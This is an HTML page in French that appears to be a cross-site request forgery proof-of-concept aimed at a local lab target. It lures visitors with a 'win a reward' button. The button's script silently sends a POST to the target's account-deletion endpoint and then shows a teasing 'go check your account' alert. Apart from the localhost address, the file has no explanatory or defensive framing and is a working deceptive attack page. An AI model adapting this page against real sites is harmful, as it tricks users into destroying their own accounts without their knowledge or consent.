<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Site</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <script>
        function performCSRF() {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://localhost/CSRF_target/process_delete_account.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    console.log(xhr.responseText);
                }
            };
            xhr.send('');
            alert('Merci ! Va voir ton compte pour une surprise 😊');
        }
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-r from-pink-500 via-red-500 to-yellow-500 min-h-screen flex items-center justify-center text-white">
    <div class="text-center bg-white bg-opacity-20 backdrop-blur-lg rounded-lg shadow-lg p-8 max-w-md mx-auto">
        <h1 class="text-4xl font-bold mb-4 text-yellow-300">🎉 Gagne une récompense !</h1>
        <p class="mb-6 text-lg">Clique sur le bouton ci-dessous pour une incroyable surprise !</p>
        <button onclick="performCSRF()" class="px-6 py-3 bg-yellow-500 text-black font-semibold text-lg rounded-lg shadow-md hover:bg-yellow-400 transition-all">
            Obtenir ma surprise ✨
        </button>
    </div>
</body>
</html>
